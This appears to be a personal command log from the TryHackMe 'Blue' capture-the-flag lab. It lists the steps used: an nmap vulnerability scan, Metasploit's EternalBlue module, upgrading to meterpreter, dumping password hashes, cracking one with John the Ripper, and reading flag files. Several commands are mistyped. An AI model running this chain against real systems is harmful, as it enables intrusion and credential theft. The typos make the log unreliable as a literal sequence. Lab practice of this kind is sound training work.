# Try-hack-me.blue
nmap -sV -sC --script vuln -oN blue.nmap 10.10.136.237
msfconsole
search ms17
search eternal
use 3
show options
set rhosts 10.10.136.237
^z
y
sessions
use post/multi/manage/shell_to_meterpreter
show options
sesions -i 1
getiud
ps
migrate 1296
hashdump
mkdir jon
cd jon
touch jon.hash
cat jon.hash
jon jon.hash --format=NT --wordlist=/opt/rockyou.txt
jon jon.hash --format=NT --show
pass: algfna22
pwd
cd ..
cd ..
pwd
ls
cd windows
cd system32
cd config
ls
cd ..
cd ..
cd ..
ls
cd users
cd jon
ls
cd documents
cat flag3.txt
flag{admin_documents_can_be_valuable}
